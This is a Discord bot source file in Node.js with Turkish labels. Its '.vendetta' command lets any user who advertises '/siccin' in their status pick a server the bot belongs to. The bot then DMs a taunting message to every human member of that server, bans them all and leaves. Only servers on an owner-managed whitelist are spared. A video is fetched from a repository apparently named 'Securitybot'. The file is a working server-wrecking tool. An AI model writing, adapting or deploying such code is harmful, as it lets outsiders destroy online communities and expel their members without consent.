require('dotenv').config();
const {
  Client, GatewayIntentBits, Partials,
  EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle,
  ModalBuilder, TextInputBuilder, TextInputStyle,
  StringSelectMenuBuilder,
  ActivityType
} = require('discord.js');

const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildPresences
  ],
  partials: [Partials.Channel]
});

// ENV
const OWNER_ID = process.env.OWNER_ID;
const SERI_ID = process.env.SERI_ID;
const WL_KANAL_ID = process.env.WL_KANAL_ID;

// DATA
let cachedVideo = null;
let whitelist = {};
let whitelistMessageId = null;

client.once("ready", async () => {
  console.log(`🚀 Bot aktif: ${client.user.tag}`);

  const videoURL = "https://raw.githubusercontent.com/ForsDev101/Securitybot/main/ssstik.io_goktug_twd_1763930201787.mp4";
  try {
    const res = await fetch(videoURL);
    const buffer = Buffer.from(await res.arrayBuffer());
    cachedVideo = { attachment: buffer, name: "video.mp4" };
    console.log("🎥 Video cachelendi");
  } catch (err) {
    console.log("❌ Video cache hatası:", err);
  }
});

// ================== WHITELIST MESAJ ==================
async function updateWhitelistMessage(channel) {
  let description = "📜 **WHITELIST SUNUCULAR**\n\n";
  for (const id in whitelist) {
    description += `• ${whitelist[id].name} | ${whitelist[id].ownerTag} | ${id}\n`;
  }

  if (whitelistMessageId) {
    const msg = await channel.messages.fetch(whitelistMessageId).catch(() => null);
    if (msg) return msg.edit({ content: description });
  }

  const msg = await channel.send({ content: description });
  whitelistMessageId = msg.id;
}

// ================== DURUM KONTROL ==================
function hasSiccinStatus(member) {
  if (!member?.presence?.activities) return false;

  return member.presence.activities.some(act =>
    act.type === ActivityType.Custom &&
    act.state &&
    (act.state.includes("/siccin") || act.state.includes(".gg/siccin"))
  );
}

// ================== VENDETTA ==================
async function vendettaCommand(message) {
  const member = await message.guild.members.fetch(message.author.id);

  if (!hasSiccinStatus(member)) {
    return message.reply("❌ Vendetta kullanmak için durumuna `/siccin` veya `.gg/siccin` yazmalısın.");
  }

  const button = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId("sorguVendetta")
      .setLabel("💣 Vendetta Başlat")
      .setStyle(ButtonStyle.Danger)
  );

  await message.author.send({
    content: "💣 **Vendetta yetkin onaylandı**\nSunucu ID girerek devam et.",
    components: [button]
  }).catch(() => {});
}

// ================== PANEL ==================
async function openPanel(message) {
  if (![OWNER_ID, SERI_ID].includes(message.author.id)) return;

  const embed = new EmbedBuilder()
    .setTitle("⚡ Vendetta Panel")
    .setDescription("Sistem seçiniz")
    .setColor("Grey");

  const selectRow = new ActionRowBuilder().addComponents(
    new StringSelectMenuBuilder()
      .setCustomId("panelMenu")
      .addOptions([{ label: "Whitelist Sistemi", value: "whitelist" }])
  );

  await message.reply({
    embeds: [embed],
    files: cachedVideo ? [cachedVideo] : [],
    components: [selectRow],
    ephemeral: true
  });
}

// ================== INTERACTIONS ==================
client.on("interactionCreate", async interaction => {

  // PANEL
  if (interaction.isStringSelectMenu() && interaction.customId === "panelMenu") {
    const embed = new EmbedBuilder()
      .setTitle("Whitelist Sistemi")
      .setDescription("Bir işlem seç")
      .setColor("Blue");

    const row = new ActionRowBuilder().addComponents(
      new StringSelectMenuBuilder()
        .setCustomId("wlMenu")
        .addOptions([
          { label: "Whitelist Ekle", value: "wlEkle" },
          { label: "Whitelist Çıkar", value: "wlCikar" }
        ])
    );

    return interaction.update({ embeds: [embed], components: [row] });
  }

  // WL MENU
  if (interaction.isStringSelectMenu() && interaction.customId === "wlMenu") {
    const modal = new ModalBuilder()
      .setCustomId(interaction.values[0])
      .setTitle("Whitelist İşlemi");

    modal.addComponents(
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId("guildID")
          .setLabel("Sunucu ID")
          .setStyle(TextInputStyle.Short)
          .setRequired(true)
      )
    );

    return interaction.showModal(modal);
  }

  // WL MODAL
  if (interaction.isModalSubmit()) {
    const guildID = interaction.fields.getTextInputValue("guildID");
    const wlChannel = await client.channels.fetch(WL_KANAL_ID);

    if (interaction.customId === "wlEkle") {
      const guild = client.guilds.cache.get(guildID);
      if (!guild) return interaction.reply({ content: "Sunucu bulunamadı", ephemeral: true });

      const owner = await guild.fetchOwner().catch(() => null);
      whitelist[guildID] = {
        name: guild.name,
        ownerTag: owner ? owner.user.tag : "Unknown"
      };

      await updateWhitelistMessage(wlChannel);
      return interaction.reply({ content: "✅ Whitelist eklendi", ephemeral: true });
    }

    if (interaction.customId === "wlCikar") {
      delete whitelist[guildID];
      await updateWhitelistMessage(wlChannel);
      return interaction.reply({ content: "🗑️ Whitelist çıkarıldı", ephemeral: true });
    }
  }

  // VENDETTA BUTTON
  if (interaction.isButton() && interaction.customId === "sorguVendetta") {
    const modal = new ModalBuilder()
      .setCustomId("vendettaModal")
      .setTitle("Sunucu ID");

    modal.addComponents(
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId("sunucuID")
          .setLabel("Sunucu ID")
          .setStyle(TextInputStyle.Short)
          .setRequired(true)
      )
    );

    return interaction.showModal(modal);
  }

  // VENDETTA MODAL
  if (interaction.isModalSubmit() && interaction.customId === "vendettaModal") {
    const guildId = interaction.fields.getTextInputValue("sunucuID");
    const guild = client.guilds.cache.get(guildId);

    if (!guild) return interaction.reply({ content: "Bot bu sunucuda değil", ephemeral: true });
    if (whitelist[guildId]) return interaction.reply({ content: "⚠️ Sunucu whitelist'te", ephemeral: true });

    await interaction.reply({ content: "💣 Vendetta başlatıldı", ephemeral: true });

    const members = await guild.members.fetch();
    const embed = new EmbedBuilder()
      .setColor("Red")
      .setTitle("💣 VENDETTA")
      .setDescription("Slained by VENDETTA");

    const tasks = [];
    for (const m of members.values()) {
      if (m.user.bot) continue;
      tasks.push(m.send({ embeds: [embed] }).catch(() => {}));
      tasks.push(m.ban({ reason: "VENDETTA" }).catch(() => {}));
    }

    await Promise.all(tasks);
    await guild.leave().catch(() => {});
  }
});

// ================== MESSAGE COMMANDS ==================
client.on("messageCreate", async message => {
  if (!message.guild || message.author.bot) return;

  const cmd = message.content.toLowerCase();

  if (cmd === ".vendetta") return vendettaCommand(message);
  if (cmd === ".vndt") return openPanel(message);
});

client.login(process.env.BOT_TOKEN);
